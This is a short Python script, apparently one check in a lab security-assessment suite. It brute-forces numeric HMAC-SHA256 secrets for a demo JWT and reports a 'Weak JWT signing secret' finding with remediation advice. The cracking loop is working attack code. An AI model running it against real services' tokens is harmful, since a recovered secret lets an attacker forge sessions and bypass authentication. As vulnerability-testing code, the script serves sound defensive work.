import base64
import hashlib
import hmac
from common import finding, get_demo_token, session

def run(max_key: int = 999999) -> dict:
    s = session()
    token = get_demo_token(s)
    signing_input, supplied_signature = token.rsplit(".", 1)
    supplied = base64.urlsafe_b64decode(supplied_signature + "=" * (-len(supplied_signature) % 4))
    cracked = None
    for number in range(max_key + 1):
        candidate = str(number).encode()
        digest = hmac.new(candidate, signing_input.encode(), hashlib.sha256).digest()
        if hmac.compare_digest(digest, supplied):
            cracked = str(number)
            break
    return finding("IASR-03", "Weak JWT signing secret", "Critical", cracked is not None, f"Recovered numeric signing secret in local lab: {cracked}" if cracked else "No numeric secret recovered within configured range.", "Use at least 256 bits of randomly generated key material stored outside source code and configuration responses.")

if __name__ == "__main__":
    print(run())
